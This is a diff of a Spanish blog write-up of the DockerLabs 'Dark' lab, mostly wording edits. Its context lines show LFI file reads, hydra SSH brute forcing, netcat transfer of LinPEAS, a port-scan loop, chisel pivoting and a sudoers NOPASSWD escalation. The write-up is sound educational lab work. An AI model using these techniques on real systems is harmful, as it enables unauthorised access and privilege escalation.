@@ -4,13 +4,14 @@ summary: "Write-up del laboratorio Dark de DockerLabs"
 author: elcybercurioso
 date: 2026-02-03 12:54:11
 categories: [Post, DockerLabs]
-tags: []
+tags: [medio, xss, lfi, brute force, ssh, pivoting, rce, suid, curl]
 media_subpath: "/assets/img/posts/dockerlabs_dark"
 image:
   path: main.webp
 ---
 
-Para desplegar las máquinas, se haría de la siguiente manera:
+>Info para desplegar las dos máquinas a la vez con el script `auto_deploy.sh`
+{: .prompt-info }
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark/docker]
@@ -78,7 +79,7 @@ Comenzamos revisando la página web alojada en la máquina A, donde vemos un for
 
 ![Desktop View](/20260128170417.webp){: width="450" height="210" .shadow}
 
-Siendo este el caso, lo que podemos hacer es desplegar un servidor local, y hacer pruebas con ficheros de nuestro equipo:
+Siendo este el caso, lo que podemos hacer es desplegar un servidor local, y hacer pruebas con ficheros de nuestra máquina:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
@@ -108,11 +109,11 @@ Siendo este el caso, creamos un fichero `index.html` e indicamos código en HTML
 <h1>Hola</h1>
 ```
 
-Y resulta ser que sí:
+Y resulta ser así:
 
 ![Desktop View](/20260128171308.webp){: width="450" height="210" .shadow}
 
-De la misma manera, si interpreta HTML, también podría ser vulnerable a XSS:
+De la misma manera, si interpreta HTML, también podría ser vulnerable a **XSS**:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
@@ -148,11 +149,11 @@ Otro fichero que podemos cargar es el propio script que se ejecuta al enviar el 
 ../../../../../../../var/www/html/process.php
 ```
 
-Vemos que carga, pero vemos que se comentan los bloques de PHP automáticamente:
+Logramos cargar su contenido, pero nos damos cuenta de que se comentan los bloques de código PHP, por lo que concluimos que no podemos usar scripts para ejecutar código de forma remota (**RCE**):
 
 ![Desktop View](/20260128192845.webp){: width="972" height="589" .shadow}
 
-Como no vemos nada destacable a simple vista, tratamos de encontrar por fuerza bruta otros ficheros en el sistema empleando **wfuzz**:
+Dado a que a simple vista no encontramos nada, tratamos de encontrar por fuerza bruta otros ficheros en el sistema empleando **wfuzz**:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
@@ -206,13 +207,13 @@ Filtered Requests: 870
 Requests/sec.: 0
 ```
 
-Sin embargo, ninguno de estos fichero contiene nada que nos dé una pista de como acceder al sistema.
+Sin embargo, ninguno de estos ficheros contiene nada que nos dé una pista de hacia donde debemos seguir.
 
 ## [máquina A] acceso inicial (toni)
 
 Mientras seguimos revisando posibles maneras de acceder al sistema, podemos tratar de encontrar la contraseña del usuario `toni` (el cual vimos al cargar el fichero `/etc/passwd`) de SSH empleando fuerza bruta con herramientas como **hydra**.
 
-Lanzamos **hydra**, y pasado un rato, nos encuentra la contraseña:
+Lanzamos **hydra**, y pasado un rato, nos encuentra la contraseña por SSH:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
@@ -242,7 +243,9 @@ toni@d61770eaef6e:~$ hostname -I
 
 Para analizar posibles vectores de escalada de privilegios, optaremos por usar la herramienta [**LinPEAS**](https://github.com/peass-ng/PEASS-ng/tree/master).
 
-Dado que la máquina no cuenta con la utilidad `wget` pero sí que tiene **netcat**, la usaremos para este propósito, donde lo primero es poner en escucha en la máquina A la herramienta **nc** de la siguiente manera:
+Dado que la máquina no cuenta con la utilidad `wget` pero sí que tiene **nc**, la emplearemos para transferir el script.
+
+Lo primero es ponernos en escucha en la máquina A con la herramienta **nc** de la siguiente manera:
 
 ```bash
 toni@d61770eaef6e:~$ nc -lp 5555 > linpeas.sh
@@ -255,14 +258,14 @@ Lo siguiente es enviar el script desde nuestra máquina, que también lo haremos
 └─$ nc -w 3 10.10.10.2 5555 < linpeas.sh
 ```
 
-Una vez se haya finalizado, podemos comprobar que se ha enviado de forma correcta generando un hash con la utilidad `md5sum`:
+Una vez haya finalizado la transferencia, podemos comprobar la integridad del script generando un hash con la utilidad `md5sum`:
 
 ```bash
 toni@d61770eaef6e:~$ md5sum linpeas.sh 
 fc112e55539511726c4c6803364596cd  linpeas.sh
 ```
 
-Si el hash generado en la máquina A coincide con el que obtenemos en nuestra máquina, podemos confirmar que se ha enviado el fichero de forma correcta:
+Si el hash generado en la máquina A coincide con el que obtenemos en nuestra máquina, podemos confirmar que se ha mantenido la integridad del script tras  el envío:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
@@ -270,20 +273,20 @@ Si el hash generado en la máquina A coincide con el que obtenemos en nuestra m�
 fc112e55539511726c4c6803364596cd  linpeas.sh
 ```
 
-Antes de ejecutar **LinPEAS**, debemos darle permisos de ejecución:
+Antes de poder ejecutar **LinPEAS**, debemos darle permisos de ejecución:
 
 ```bash
 toni@d61770eaef6e:~$ chmod +x linpeas.sh
 ```
 
-Tras ejecutar el script, encontramos que existe el fichero `info` en el directorio `/var/www/html`, cuyo contenido va dirigido al usuario con el que estamos conectados (`toni`), e indica que en la máquina con IP `20.20.20.3` hay una página desplegada:
+En los resultados que nos devuelve el script, encontramos que existe el fichero `info` en el directorio `/var/www/html`, cuyo contenido va dirigido al usuario con el que estamos conectados (`toni`), e indica que en la máquina con IP `20.20.20.3` hay una página desplegada:
 
 ```bash
 toni@d61770eaef6e:~$ cat /var/www/html/info
 Toni te recuerdo que he publicado las bases de datos de telefonica,la dgt y el banco santander en mi pagina ilegal (20.20.20.3)
 ```
 
-Dado que sabemos cual es la IP de la máquina B que está en el segmento `20.20.20.0/24`, podemos emplear el siguiente script para listar los puertos abiertos:
+Dado que sabemos cual es la IP de la máquina B que está en el segmento `20.20.20.0/24`, podemos emplear el siguiente script para listar sus puertos abiertos:
 
 ```bash
 toni@d61770eaef6e:~$ cat portDiscovery.sh 
@@ -292,7 +295,7 @@ for port in $(seq 1 10000); do
 done
 ```
 
-Le damos permisos de ejecución al script:
+Le damos permisos de ejecución al script `portDiscovery.sh`:
 
 ```bash
 toni@d61770eaef6e:~$ chmod +x portDiscovery.sh
@@ -308,7 +311,7 @@ Port 80 is open
 
 ## [máquina B] privoting (www-data)
 
-Para traernos el puerto 80 de la máquina B a nuestra máquina usaremos [**chisel**](https://github.com/jpillora/chisel), el cual transferiremos a la máquina A usando la utilidad `scp`, ya que tenemos credenciales de SSH válidas:
+Para traernos el puerto 80 de la máquina B a nuestra máquina emplearemos [**chisel**](https://github.com/jpillora/chisel), que transferiremos a la máquina A usando la utilidad `scp`, ya que tenemos credenciales de SSH válidas:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
@@ -388,17 +391,17 @@ Si ahora tratamos de acceder a la máquina B desde la nuestra, pero empleando `p
 Para poder acceder desde el navegador, necesitaremos una extensión como, por ejemplo, **FoxyProxy** para poder configurar fácilmente proxies.
 
 Crearemos un nuevo perfil para el proxy que se abre con **chisel**:
-- Tipo: SOCKS5
-- Host: 127.0.0.1
-- Puerto: 1080
+- *Tipo*: **SOCKS5**
+- *Host*: **127.0.0.1**
+- *Puerto*: **1080**
 
 ![Desktop View](/20260128232015.webp){: width="972" height="589" .shadow}
 
 Una vez configurado, seleccionamos el perfil que acabamos de crear:
 
-![Desktop View](/20260128231924.webp){: width="550" height="290" .shadow}
+![Desktop View](/20260128231924.webp){: width="450" height="260" .shadow}
 
-Si ahora accedemos a la máquina B, veremos que nos carga la página:
+Veremos que ahora nos carga la página alojada en la máquina B:
 
 ![Desktop View](/20260128231901.webp){: width="450" height="210" .shadow}
 
@@ -522,7 +525,7 @@ www-data@111bb84cbd16:/tmp$ tail -n 3 test.txt
 www-data ALL=(ALL:ALL) NOPASSWD: ALL
 ```
 
-Si ahora revisamos los permisos SUDO del usuario `www-data`, veremos que tiene permisos de administrador en el sistema:
+Si ahora revisamos los permisos SUDO del usuario `www-data`, veremos que tiene permisos elevados en el sistema:
 
 ```bash
 www-data@111bb84cbd16:/tmp$ sudo -l
